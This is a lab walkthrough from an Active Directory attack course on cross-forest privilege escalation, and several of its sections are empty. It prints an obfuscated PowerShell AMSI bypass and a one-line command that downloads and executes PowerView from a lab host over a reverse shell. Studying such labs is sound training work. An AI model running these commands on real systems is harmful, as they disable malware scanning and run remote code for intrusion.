# Hands-on 27: Cross Forest Attacks - Foreign Security Principals & ACLs

- [Hands-on 27: Cross Forest Attacks - Foreign Security Principals & ACLs](#hands-on-27-cross-forest-attacks---foreign-security-principals--acls)
  - [Tasks](#tasks)
  - [Execute cross forest attack on dbvendor.local by abusing ACLs](#execute-cross-forest-attack-on-dbvendorlocal-by-abusing-acls)
  - [Enumerate FSPs for db.local and escalate privileges to DA by compromising the FSPs](#enumerate-fsps-for-dblocal-and-escalate-privileges-to-da-by-compromising-the-fsps)

---

## Tasks

Using the reverse shell on `db.local`:

- Execute cross forest attack on `dbvendor.local` by abusing ACLs
- Enumerate FSPs for `db.local` and escalate privileges to DA by compromising the FSPs.

<br/>

---

## Execute cross forest attack on dbvendor.local by abusing ACLs

Get a reverse shell from `db-sqlsrv` with reference to [Hands-on 26](l26-XForestMSSQL.md).

Bypass AMSI on `db-sqlsrv`:

```
[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.'+$([system.NEt.weBUtILITY]::HTmldecode('&#65;&#109;&#115;&#105;'))+'Utils').GetField(''+$([chAR](5723/59)+[chAR]([BYTE]0x6D)+[CHAR]([BytE]0x73)+[CHAr]([ByTE]0x69))+'Context',[Reflection.BindingFlags]$([cHaR]([BYTE]0x4E)+[chAr]([ByTe]0x6F)+[char](1+109)+[ChAR]([bYtE]0x50)+[chaR](117)+[CHar]([bYte]0x62)+[ChAr](108)+[cHar]([ByTE]0x69)+[cHaR]([BYtE]0x63)+[ChAR](44)+[cHAR](53+30)+[chAR]([ByTE]0x74)+[CHAR](13+84)+[CHar]([byte]0x74)+[cHaR](117-12)+[cHAr]([BYtE]0x63))).GetValue($null),0x567EB97B);
```

<br/>

Import `PowerView.ps1` on `db-sqlsrv`:

```
iex ((New-Object Net.Webclient).DownloadString("http://192.168.100.64/PowerView.ps1"))
```

![picture 7](images/d5375cefc376c46c5ff215942d028c4e829ba36af35fb68d73fb4fc1947da081.png)  

<br/>



<br/>

---

## Enumerate FSPs for db.local and escalate privileges to DA by compromising the FSPs

<br/>

---